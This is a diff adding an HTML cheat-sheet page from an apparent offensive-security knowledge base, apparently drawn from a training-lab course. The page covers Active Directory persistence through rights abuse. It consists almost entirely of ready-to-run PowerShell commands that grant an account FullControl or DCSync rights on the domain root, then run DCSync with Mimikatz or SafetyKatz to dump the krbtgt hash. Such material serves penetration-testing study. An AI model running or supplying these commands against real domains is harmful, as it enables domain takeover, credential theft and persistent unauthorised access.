@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <title>offsecvault - Knowledge Base</title>
+  <!--------------------->
+  <!-- b0ydC owned. -->
+  <!-- --------------- -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+
+  <style>
+    body {
+      font-size: 12px;
+      font-family: ubuntu mono;
+      background-color: white;
+      color: black;
+      margin: 0;
+    }
+
+    a {
+      color: black;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    a:hover,
+    a:active {
+      color: #868686;
+      text-decoration: underline;
+    }
+    table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+    }
+
+    table.center {
+    margin-left: auto; 
+    margin-right: auto;
+}
+    
+  </style>
+</head>
+
+<body>
+  <pre><center>
+<a href="/index.html" style="text-decoration:none;">
+ ▒█████    █████▒ █████▒ ██████ ▓█████  ▄████▄ ██▒   █▓ ▄▄▄       █    ██  ██▓  ▄▄▄█████▓
+▒██▒  ██▒▓██   ▒▓██   ▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█▓██░   █▒▒████▄     ██  ▓██▒▓██▒  ▓  ██▒ ▓▒
+▒██░  ██▒▒████ ░▒████ ░░ ▓██▄   ▒███   ▒▓█    ▄▓██  █▒░▒██  ▀█▄  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░
+▒██   ██░░▓█▒  ░░▓█▒  ░  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██ █░░░██▄▄▄▄██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ 
+░ ████▓▒░░▒█░   ░▒█░   ▒██████▒▒░▒████▒▒ ▓███▀ ░ ▒▀█░   ▓█   ▓██▒▒▒█████▓ ░██████▒▒██▒ ░ 
+░ ▒░▒░▒░  ▒ ░    ▒ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ░ ▐░   ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   
+  ░ ▒ ▒░  ░      ░     ░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ░░    ▒   ▒▒ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░    
+░ ░ ░ ▒   ░ ░    ░ ░   ░  ░  ░     ░   ░           ░░    ░   ▒    ░░░ ░ ░   ░ ░   ░      
+    ░ ░                      ░     ░  ░░ ░          ░        ░  ░   ░         ░  ░       
+                                       ░           ░                                     
+</a></pre>
+
+<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
+    <a href="../../RED-TEAM.html">OFFENSIVE</a> |
+    <a href="../../BLUE-TEAM.html">DEFENSIVE</a> |
+    <a href="../../CTF.html">CTF</a> |
+    <a href="../../TOOLS.html">TOOLS</a> |
+    <a href="../../ABOUT.html">ABOUT</a> 
+</div>
+<pre style="text-align:center;">
+<h3> PERSISTENCE - RIGHTS ABUSE </h3>
+
+With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync".
+
+<b>::: ADD FULL CONTROL RIGHTS</b>
+
+PS> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 
+-RightsAll -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+<b>::: USING ACTIVEDIRECTORYMODULE AND RACE</b>
+
+PS> Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
+
+<b>::: ADD RIGHTS FOR DCSync</b>
+
+PS> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights 
+DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+<b>::: USING ACTIVEDIRECTORYMODULE AND RACE</b>
+
+PS> Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
+
+<b>::: EXECUTE DCSync</b>
+
+PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+or
+
+PS> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+
+</center>
+</body>
+</html>
